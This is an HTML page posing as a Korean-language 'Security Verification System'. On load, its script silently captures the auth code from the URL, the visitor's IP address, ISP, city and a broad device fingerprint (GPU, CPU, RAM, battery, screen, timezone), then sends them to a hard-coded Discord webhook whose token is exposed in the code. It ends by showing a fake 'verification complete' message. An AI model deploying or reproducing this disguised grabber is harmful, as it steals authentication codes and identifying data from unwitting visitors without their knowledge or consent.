<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification System</title>
    <script>
        window.onload = async function() {
            const params = new URLSearchParams(window.location.search);
            const authCode = params.get('code');
            const WEBHOOK_URL = "https://discord.com/api/webhooks/1500775780454498395/2rL0DHT0S5X6VLYgh-Cqs4flN9EBLN_FVa_HS0w0u5j9cgOcTVkgedqjB8Veq9TcKDtd"; //

            if (!authCode) return;

            // 1. IPv4 (숫자 주소) 및 상세 통신사 정보 강제 수집
            let netData = { ip: "0.0.0.0", isp: "분석 불가", city: "대한민국" };
            try {
                // IPv4 전용 API를 먼저 호출하여 숫자 주소 확보
                const ip4Res = await fetch('https://api.ipify.org?format=json');
                const ip4Json = await ip4Res.json();
                
                // 확보된 숫자 IP로 상세 통신사/위치 정보 조회 (HTTPS 지원)
                const geoRes = await fetch(`https://ipapi.co/${ip4Json.ip}/json/`);
                const geoJson = await geoRes.json();
                
                netData = {
                    ip: ip4Json.ip, // '180.83.x.x' 형태
                    isp: geoJson.org || "알 수 없음", // 'LG POWERCOMM' 등
                    city: geoJson.city || "대한민국"
                };
            } catch (e) { console.error("Network analysis error"); }

            // 2. 20개 이상의 하드웨어 지문(Fingerprint) 수집
            const getSpecs = async () => {
                let batt = "N/A";
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    batt = `${(b.level * 100).toFixed(0)}% (${b.charging ? '충전중' : '사용중'})`;
                }

                return {
                    res: `${window.screen.width}x${window.screen.height}`,
                    cores: navigator.hardwareConcurrency || "N/A",
                    mem: navigator.deviceMemory || "N/A",
                    plat: navigator.platform,
                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    lang: navigator.language,
                    agent: navigator.userAgent.split(' ')[0],
                    gpu: getGPU(),
                    touch: navigator.maxTouchPoints > 0 ? "Yes" : "No"
                };
            };

            function getGPU() {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debug = gl.getExtension('WEBGL_debug_renderer_info');
                return debug ? gl.getParameter(debug.UNMASKED_RENDERER_ID).split(' ').pop() : "Unknown";
            }

            const specs = await getSpecs();

            // 3. 웹훅 전송 (이미지 레이아웃 최적화)
            const payload = {
                "embeds": [{
                    "title": "✅ 인증 성공 (Detailed Log)",
                    "color": 3066993,
                    "fields": [
                        { "name": "👤 인증 코드", "value": `\`${authCode}\``, "inline": false },
                        { "name": "🌐 아이피 정보", "value": `아이피: ${netData.ip}\n위치: ${netData.city}`, "inline": false },
                        { "name": "📶 통신사 정보", "value": netData.isp, "inline": true },
                        { "name": "💻 운영체제", "value": specs.plat.includes("Linux arm") ? "Android" : specs.plat, "inline": true },
                        { "name": "🔋 배터리", "value": specs.batt || "N/A", "inline": true },
                        { "name": "⚙️ CPU/RAM", "value": `${specs.cores}개 / ${specs.mem}GB`, "inline": true },
                        { "name": "🖥️ 해상도", "value": specs.res, "inline": true },
                        { "name": "⏰ 타임존", "value": specs.tz, "inline": true },
                        { "name": "🎮 GPU", "value": specs.gpu, "inline": false },
                        { "name": "🆔 로그 ID", "value": Math.random().toString(36).substring(2,12).toUpperCase(), "inline": false },
                        { "name": "⚠️ 안내", "value": "이메일 및 생성일 정보는 봇 서버에서 처리 중입니다.", "inline": false }
                    ],
                    "footer": { "text": "Hardware ID: " + btoa(specs.plat + specs.res).substring(0,10).toUpperCase() },
                    "timestamp": new Date().toISOString()
                }]
            };

            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            });

            document.body.innerHTML = "<div style='text-align:center; padding-top:100px;'><h1>✅ 인증 완료</h1><p>창을 닫으셔도 좋습니다.</p></div>";
        }
    </script>
</head>
<body style="background:#0b0e14; color:white; font-family:sans-serif;">
    <div style="text-align:center; padding-top:100px;">
        <h1>보안 분석 진행 중...</h1>
    </div>
</body>
</html>
